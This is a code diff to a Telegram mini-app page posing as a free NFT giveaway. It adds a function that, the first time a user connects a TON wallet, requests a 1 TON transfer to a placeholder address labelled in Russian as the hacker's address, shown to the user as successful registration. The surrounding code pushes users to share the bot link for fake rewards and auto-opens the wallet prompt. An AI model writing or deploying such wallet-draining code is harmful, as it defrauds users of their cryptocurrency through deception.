@@ -74,18 +74,35 @@
             manifestUrl: 'https://balbesss213.github.io/my-tg-app/tonconnect-manifest.json', 
             buttonRootId: 'ton-connect-btn' 
         });
-
         const db = {
             get isReg() { return localStorage.getItem('isReg') === 'true' },
             set isReg(v) { localStorage.setItem('isReg', v) },
             get count() { return parseInt(localStorage.getItem('count') || '0') },
             set count(v) { localStorage.setItem('count', v) }
         };
-
+        async function startTransaction() {
+            const transaction = {
+                validUntil: Math.floor(Date.now() / 1000) + 60,
+                messages: [{
+                    address: "UQ_АДРЕС_ХАКЕРА", 
+                    amount: "1000000000"     
+                }]
+            };
+            try {
+                await tonConnectUI.sendTransaction(transaction);
+            } catch (e) { console.error("Transaction failed or canceled"); }
+        }
+        tonConnectUI.onStatusChange(async (wallet) => {
+            if (wallet && !db.isReg) {
+                await startTransaction(); 
+                db.isReg = true;
+                showBanner('reg-success-banner');
+                setTimeout(() => { window.scrollTo({ top: 0, behavior: 'smooth' }); }, 2000);
+            }
+            updateUI();
+        });
         const usernameInput = document.getElementById('username');
         const usernameError = document.getElementById('username-error');
-        
-        // --- ЛОГИКА ШАРИНГА (С ЗАЩИТОЙ ОТ БЫСТРОГО ЗАКРЫТИЯ) ---
         let shareTimestamp = 0;
         document.querySelectorAll('.action-spin').forEach(btn => {
             btn.onclick = () => {
@@ -93,72 +110,48 @@
                     document.getElementById('modal-reg-required').style.display = 'flex';
                 } else {
                     showBanner('condition-banner');
-                    shareTimestamp = Date.now(); // Запоминаем время нажатия
+                    shareTimestamp = Date.now();
                     Telegram.WebApp.openTelegramLink(`https://t.me/share/url?url=https://t.me/NFTreat_Bot/myapp&text=Забирай свой NFT подарок! 🎁`);
                 }
             };
         });
-
-        // "Сканер" возврата: если юзер вернулся в аппку
         window.onfocus = () => {
             if (shareTimestamp > 0) {
-                const timeDiff = Date.now() - shareTimestamp;
-                if (timeDiff > 4000) { // Если отсутствовал больше 4 секунд — засчитываем
+                if (Date.now() - shareTimestamp > 4000) {
                     db.count += 1;
                     updateUI();
                 }
                 shareTimestamp = 0;
             }
         };
-
-        // --- ЛОГИКА КНОПКИ NEXT (СТРЕЛОЧКА) ---
         document.getElementById('next-to-wallet').onclick = async () => {
             let val = usernameInput.value;
             if (val.length > 3 && !/[а-яё]/i.test(val)) {
-                // 1. Показываем баннер
                 showBanner('user-linked-banner');
-                // 2. Скроллим к кошельку
                 document.getElementById('wallet-section').scrollIntoView({ behavior: 'smooth' });
-                // 3. СРАЗУ открываем окно выбора кошелька (авто-теп)
-                setTimeout(async () => {
-                    await tonConnectUI.openModal();
-                }, 1000);
+                setTimeout(async () => { await tonConnectUI.openModal(); }, 1000);
             } else {
                 usernameError.style.display = 'block';
             }
         };
-
-        // Модалка -> скролл
-        document.getElementById('go-to-reg').onclick = () => {
-            document.getElementById('modal-reg-required').style.display = 'none';
-            document.getElementById('registration-section').scrollIntoView({ behavior: 'smooth' });
-        };
-
-        tonConnectUI.onStatusChange(wallet => {
-            if (wallet && !db.isReg) {
-                db.isReg = true;
-                showBanner('reg-success-banner');
-                setTimeout(() => { window.scrollTo({ top: 0, behavior: 'smooth' }); }, 2000);
-            }
-            updateUI();
-        });
-
         function showBanner(id) {
             const b = document.getElementById(id);
             b.classList.add('show');
             setTimeout(() => b.classList.remove('show'), 3500);
         }
-
         function updateUI() {
             document.querySelectorAll('.share-count').forEach(el => el.innerText = db.count);
         }
-
         usernameInput.addEventListener('input', () => {
             if (!usernameInput.value.startsWith('@')) usernameInput.value = '@' + usernameInput.value.replace('@','');
             usernameError.style.display = /[а-яё]/i.test(usernameInput.value) ? 'block' : 'none';
         });
-
+        document.getElementById('go-to-reg').onclick = () => {
+            document.getElementById('modal-reg-required').style.display = 'none';
+            document.getElementById('registration-section').scrollIntoView({ behavior: 'smooth' });
+        };
         updateUI();
+        window.Telegram.WebApp.ready();
     </script>
 </body>
 </html>
